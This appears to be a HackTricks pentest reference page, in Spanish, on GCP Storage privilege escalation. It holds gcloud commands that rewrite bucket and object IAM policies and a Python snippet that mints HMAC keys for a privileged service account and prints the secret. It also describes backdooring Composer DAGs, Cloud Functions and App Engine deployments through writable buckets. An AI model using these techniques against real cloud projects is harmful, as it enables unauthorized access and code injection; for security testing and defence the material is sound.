# GCP - Storage Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Storage

Información básica:

{{#ref}}
../gcp-services/gcp-storage-enum.md
{{#endref}}

### `storage.objects.get`

Este permiso te permite **descargar archivos almacenados en Cloud Storage**. Esto potencialmente te permitirá escalar privilegios porque en algunas ocasiones se guarda **información sensible allí**. Además, algunos servicios de GCP almacenan su información en buckets:

- **GCP Composer**: Cuando creas un Composer Environment el **código de todos los DAGs** se guardará dentro de un **bucket**. Estas tareas pueden contener información interesante en su código.
- **GCR (Container Registry)**: La **imagen** de los contenedores se almacena dentro de **buckets**, lo que significa que si puedes leer los buckets podrás descargar las imágenes y **buscar leaks y/o código fuente**.

### `storage.objects.setIamPolicy`

Puede otorgarte permiso para **abusar cualquiera de los escenarios anteriores de esta sección**.
```bash
# Add binding
gcloud storage objects add-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Remove binding
gcloud storage objects remove-iam-policy-binding gs://<BUCKET_NAME>/<OBJECT_NAME> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role="<ROLE>" \
--project=<PROJECT_ID>

# Change Policy
gcloud storage objects set-iam-policy gs://<BUCKET_NAME>/<OBJECT_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
### **`storage.buckets.setIamPolicy`**

Para un ejemplo de cómo modificar permisos con este permiso consulta esta página:
```bash
# Add binding
gcloud storage buckets add-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Remove binding
gcloud storage buckets remove-iam-policy-binding gs://<MY_BUCKET> \
--member="<MEMBER_TYPE>:<MEMBER_IDENTIFIER>" \
--role=<ROLE> \
--project=<MY_PROJECT>

# Change policy
gcloud storage buckets set-iam-policy gs://<BUCKET_NAME> - \
--project=<PROJECT_ID> <<'POLICY'
{
"bindings": [
{
"role": "<ROLE>",
"members": [
"<MEMBER_TYPE>:<MEMBER_IDENTIFIER>"
]
}
]
}
POLICY

```
{{#ref}}
../gcp-unauthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md
{{#endref}}

### `storage.hmacKeys.create`

La función "interoperability" de Cloud Storage, diseñada para **cross-cloud interactions** como con AWS S3, implica la **creación de HMAC keys para Service Accounts y usuarios**. Un atacante puede explotarlo **generando una HMAC key para un Service Account con privilegios elevados**, lo que permite **escalar privilegios dentro de Cloud Storage**. Mientras que las HMAC keys asociadas a usuarios sólo son recuperables vía la web console, tanto las access como secret keys permanecen **perpetuamente accesibles**, permitiendo almacenar accesos de respaldo. En cambio, las HMAC keys vinculadas a Service Accounts son accesibles por API, pero sus access y secret keys no son recuperables tras la creación, añadiendo una capa de complejidad para el acceso continuo.
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
Otro script de exploit para este método puede encontrarse [aquí](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py).

### `storage.objects.create`, `storage.objects.delete` = Permisos de escritura de Storage

Para **crear un nuevo objeto** dentro de un bucket necesitas `storage.objects.create` y, según [la docs](https://cloud.google.com/storage/docs/access-control/iam-permissions#object_permissions), también necesitas `storage.objects.delete` para **modificar** un objeto existente.

Una explotación muy **común** de buckets donde puedes escribir en la nube es cuando el **bucket está guardando archivos de un servidor web**: podrías **almacenar nuevo código** que sea usado por la aplicación web.

### Composer

**Composer** es **Apache Airflow** gestionado dentro de GCP. Tiene varias características interesantes:

- Se ejecuta dentro de un **GKE cluster**, así que la **SA que usa el cluster es accesible** por el código que se ejecuta dentro de Composer.
- Todos los componentes de un entorno de Composer (**código de los DAGs**, plugins y datos) se almacenan dentro de un bucket de GCP. Si el atacante tiene permisos de lectura y escritura sobre él, podría monitorizar el bucket y **siempre que se cree o actualice un DAG, subir una versión backdoored** para que el entorno de Composer obtenga desde Storage la versión backdoored.

**Puedes encontrar un PoC de este ataque en el repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs**](https://github.com/carlospolop/Monitor-Backdoor-Composer-DAGs)

### Cloud Functions

- El código de Cloud Functions se almacena en Storage y cuando se crea una nueva versión el código se sube al bucket y luego se construye el nuevo contenedor a partir de ese código. Por lo tanto, **sobrescribiendo el código antes de que se construya la nueva versión es posible hacer que la Cloud Function ejecute código arbitrario**.

**Puedes encontrar un PoC de este ataque en el repo:** [**https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions**](https://github.com/carlospolop/Monitor-Backdoor-Cloud-Functions)

### App Engine

Las versiones de App Engine generan algunos datos dentro de un bucket con el formato de nombre: `staging.<project-id>.appspot.com`. Dentro de este bucket es posible encontrar una carpeta llamada `ae` que contendrá una carpeta por versión de la aplicación de App Engine y dentro de esas carpetas será posible encontrar el archivo `manifest.json`. Este archivo contiene un json con todos los archivos que deben usarse para crear la versión específica. Además, es posible encontrar **los nombres reales de los archivos, la URL a ellos dentro del bucket de GCP (los archivos dentro del bucket cambiaron su nombre por su hash sha1) y el hash sha1 de cada archivo.**

_Note que no es posible realizar un pre-takeover de este bucket porque los usuarios de GCP no están autorizados a generar buckets usando el dominio appspot.com._

Sin embargo, con acceso de lectura y escritura sobre este bucket, es posible escalar privilegios a la SA adjunta a la versión de App Engine monitorizando el bucket y, cada vez que se realiza un cambio (nueva versión), modificar la nueva versión lo más rápido posible. De este modo, el contenedor que se cree a partir de ese código ejecutará el código backdoored.

El ataque mencionado puede realizarse de muchas maneras diferentes; todas empiezan monitorizando el bucket `staging.<project-id>.appspot.com`:

- Subir el código completo nuevo de la versión de App Engine a un bucket diferente y disponible y preparar un **`manifest.json` con el nombre del nuevo bucket y los hashes sha1 de los archivos**. Luego, cuando se cree una nueva versión dentro del bucket, solo necesitas modificar el `manifest.json` y subir el malicioso.
- Subir una versión modificada de `requirements.txt` que use dependencias maliciosas y actualizar el `manifest.json` con el nuevo nombre de archivo, URL y su hash.
- Subir un **`main.py` o `app.yaml` modificado que ejecute el código malicioso** y actualizar el `manifest.json` con el nuevo nombre de archivo, URL y su hash.

**Puedes encontrar un PoC de este ataque en el repo:** [**https://github.com/carlospolop/Monitor-Backdoor-AppEngine**](https://github.com/carlospolop/Monitor-Backdoor-AppEngine)

### GCR

- **Google Container Registry** almacena las imágenes dentro de buckets; si puedes **escribir en esos buckets** podrías **moverte lateralmente hacia donde se ejecutan esas imágenes.**
- El bucket usado por GCR tendrá una URL similar a `gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com` (Los subdominios de primer nivel están especificados [aquí](https://cloud.google.com/container-registry/docs/pushing-and-pulling)).

> [!TIP]
> Este servicio está obsoleto, así que este ataque ya no es útil. Además, Artifact Registry, el servicio que sustituye a este, no almacena las imágenes en buckets.

## **Referencias**

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
